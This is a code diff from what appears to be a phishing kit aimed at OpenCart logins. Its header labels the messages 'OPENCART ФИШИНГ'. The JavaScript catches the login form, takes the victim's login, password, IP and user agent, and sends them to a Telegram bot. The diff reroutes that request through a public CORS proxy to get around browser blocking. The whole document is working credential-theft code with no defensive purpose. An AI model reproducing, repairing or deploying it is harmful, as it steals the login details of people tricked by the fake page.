@@ -12,14 +12,18 @@ async function getUserIP() {
 async function sendToTelegram(login, password, ip) {
     const message = `🛡️ OPENCART ФИШИНГ 🛡️\n\n👤 Логин: ${login}\n🔑 Пароль: ${password}\n🌐 IP: ${ip}\n⏰ Время: ${new Date().toLocaleString()}\n🖥️ User Agent: ${navigator.userAgent}`;
     
+    // Используем работающий CORS-прокси
+    const targetUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(targetUrl)}`;
+    
     try {
-        const response = await fetch(`https://api.telegram.org/bot${window.BOT_TOKEN}/sendMessage`, {
+        const response = await fetch(proxyUrl, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
             },
             body: JSON.stringify({
-                chat_id: window.CHAT_ID,
+                chat_id: CHAT_ID,
                 text: message
             })
         });
@@ -27,18 +31,22 @@ async function sendToTelegram(login, password, ip) {
         const result = await response.json();
         console.log('Telegram response:', result);
         
-        if (!response.ok) {
-            console.error('Error:', result);
+        if (result && result.ok !== false) {
+            console.log('✅ Успешно отправлено в Telegram!');
+        } else {
+            console.error('❌ Ошибка:', result);
         }
     } catch (error) {
         console.error('Network error:', error);
     }
 }
 
-// Ждём загрузку DOM
 document.addEventListener('DOMContentLoaded', function() {
     const form = document.getElementById('loginForm');
-    if (!form) return;
+    if (!form) {
+        console.error('Form not found!');
+        return;
+    }
     
     form.addEventListener('submit', async function(e) {
         e.preventDefault();
@@ -52,7 +60,6 @@ document.addEventListener('DOMContentLoaded', function() {
         }
         
         const submitBtn = form.querySelector('button[type="submit"]');
-        const originalText = submitBtn.innerHTML;
         submitBtn.innerHTML = '<i class="fa fa-spinner fa-spin"></i> Перевірка...';
         submitBtn.disabled = true;
         
